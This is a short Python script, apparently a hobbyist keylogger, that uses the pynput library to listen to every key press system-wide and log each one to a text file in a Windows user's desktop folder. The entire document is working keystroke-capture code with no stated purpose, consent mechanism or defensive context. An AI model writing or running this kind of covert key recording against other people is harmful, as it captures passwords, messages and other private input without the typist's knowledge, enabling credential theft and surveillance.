from pynput.keyboard import Key, Listener
import logging

log_dir = "C:/Users/comp/Desktop/logs/"

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='Key-Recorded: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
